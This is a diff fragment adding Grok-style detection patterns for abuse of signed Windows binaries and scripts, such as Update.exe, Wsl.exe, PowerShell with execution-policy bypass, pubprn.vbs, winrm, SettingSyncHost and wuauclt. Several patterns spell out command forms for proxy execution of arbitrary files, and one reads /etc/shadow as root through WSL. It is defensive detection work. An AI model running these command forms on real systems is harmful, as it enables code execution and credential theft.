+    EXEC_UPDATE_1: "Update\\.exe --update=%{NOTSPACE:targetFile}"
+    EXEC_UPDATE_2: "Update\\.exe --updateRollback=%{NOTSPACE:targetFile}"
+    EXEC_UPDATE_3: "Update\\.exe --processStart %{NOTSPACE:targetFile} --process-start-args \\\"/arg1 /arg2\\\""
+
+    # --- Wsl.exe ---
+    EXEC_WSL_1: "%{WORD:process}\\.exe -e %{NOTSPACE:targetFile}"
+    EXEC_WSL_2: "%{WORD:process}\\.exe -u root -e cat /etc/shadow"
+    EXEC_WSL_3: "%{WORD:process}\\.exe --exec bash -c \\\"%{GREEDYDATA:targetFile}\\\""
+
+    # --- Scripting (PS1, WSF, VBS) ---
+    EXEC_PS1_1: "powershell\\.exe -ep bypass -command \\\"set-location -path C:\\\\Windows\\\\diagnostics\\\\system\\\\Audio; import-module \\.\\\\CL_LoadAssembly\\.ps1; LoadAssemblyFromPath %{NOTSPACE:targetFile};\\[Program\\]::Fun\\(\\)\\\""
+    EXEC_PS1_2: "\\. C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Invocation\\.ps1 \\\\nSyncInvoke %{GREEDYDATA:targetFile}"
+    EXEC_WSF_1: "set comspec=%{NOTSPACE:targetFile} & cscript c:\\\\windows\\\\system32\\\\manage-bde\\.wsf"
+    EXEC_VBS_1: "pubprn\\.vbs 127\\.0\\.0\\.1 script:%{NOTSPACE:targetFile}"
+    EXEC_WINRM_1: "winrm invoke Create wmicimv2/Win32_Process @\\{CommandLine=\\\"%{GREEDYDATA:targetFile}\\\"\\} -r:http://target:5985"
+
+    # --- Others (Ie4uinit, SettingSyncHost, Wlrmdr, etc.) ---
+    EXEC_IE4UINIT_1: "%{WORD:process}\\.exe -BaseSettings"
+    EXEC_IEDIAGCMD_1: "set windir=c:\\\\test& cd \\\"C:\\\\Program Files\\\\Internet Explorer\\\" & iediagcmd\\.exe /out:%{NOTSPACE:targetFile}"
+    EXEC_MSCONFIG_1: "%{WORD:process}\\.exe -5"
+    EXEC_PCWRUN_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+    EXEC_SCRIPTRUNNER_1: "Scriptrunner\\.exe -appvscript %{NOTSPACE:targetFile}"
+    EXEC_SETTINGSYNCHOST_1: "SettingSyncHost -LoadAndRunDiagScript %{NOTSPACE:targetFile}"
+    EXEC_SETTINGSYNCHOST_2: "SettingSyncHost -LoadAndRunDiagScriptNoCab %{NOTSPACE:targetFile}"
+    EXEC_WLRMDR_1: "wlrmdr\\.exe -s 3600 -f 0 -t _ -m _ -a 11 -u %{NOTSPACE:targetFile}"
+    EXEC_WUAUCLT_1: "wuauclt\\.exe /UpdateDeploymentProvider %{NOTSPACE:targetFile} /RunHandlerComServer"
+  
+  Reconnaissance:
+    # TODO: Add rules for Reconnaissance
+
+  Tamper:
+    # TODO: Add rules for Tamper
+
+  UAC_bypass:
+    # TODO: Add rules for UAC bypass
+
+  Upload:
+    # TODO: Add rules for Upload
